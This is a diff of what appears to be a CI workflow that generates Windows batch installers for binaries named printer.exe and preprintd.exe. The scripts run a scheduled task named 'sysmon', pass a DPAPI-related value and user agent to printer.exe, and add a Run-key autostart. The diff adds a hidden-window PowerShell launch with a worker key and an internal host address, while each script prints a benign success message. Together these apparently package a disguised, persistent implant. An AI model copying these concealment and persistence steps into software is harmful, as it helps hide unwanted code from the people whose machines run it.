@@ -92,7 +92,8 @@ jobs:
             'schtasks /Run /TN "sysmon" >nul',
             'echo Setup completed successfully.',
             'timeout /t 3 >nul',
-            'endlocal'
+            'endlocal',
+            'exit /b'
           ) | Set-Content -Path "admin.bat" -Encoding ASCII
 
           @(
@@ -109,7 +110,8 @@ jobs:
             'start "" "%d%\printer.exe" "%dpapi%" "%ua%"',
             'echo Setup completed successfully.',
             'timeout /t 3 >nul',
-            'endlocal'
+            'endlocal',
+            'exit /b'
           ) | Set-Content -Path "user.bat" -Encoding ASCII
 
           @(
@@ -166,7 +168,8 @@ jobs:
             'schtasks /Run /TN "preprintd" >nul',
             'echo Setup completed successfully.',
             'timeout /t 3 >nul',
-            'endlocal'
+            'endlocal',
+            'exit /b'
           ) | Set-Content -Path "preprintd-admin.bat" -Encoding ASCII
 
           @(
@@ -183,10 +186,15 @@ jobs:
             'setx DEF_HOST "172.16.0.111" >nul 2>&1',
             'setx DEF_QUEUE "secure" >nul 2>&1',
             'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "preprintd" /t REG_SZ /d "\"%d%\preprintd.exe\"" /f >nul',
-            'start "" "%d%\preprintd.exe"',
+            'set "WORKER_KEY=%k%"',
+            'set "ALIAS=%alias%"',
+            'set "DEF_HOST=172.16.0.111"',
+            'set "DEF_QUEUE=secure"',
+            'powershell -NoProfile -Command "Start-Process -FilePath ''%d%\preprintd.exe'' -WindowStyle Hidden"',
             'echo Setup completed successfully.',
             'timeout /t 3 >nul',
-            'endlocal'
+            'endlocal',
+            'exit /b'
           ) | Set-Content -Path "preprintd-user.bat" -Encoding ASCII
 
           @(
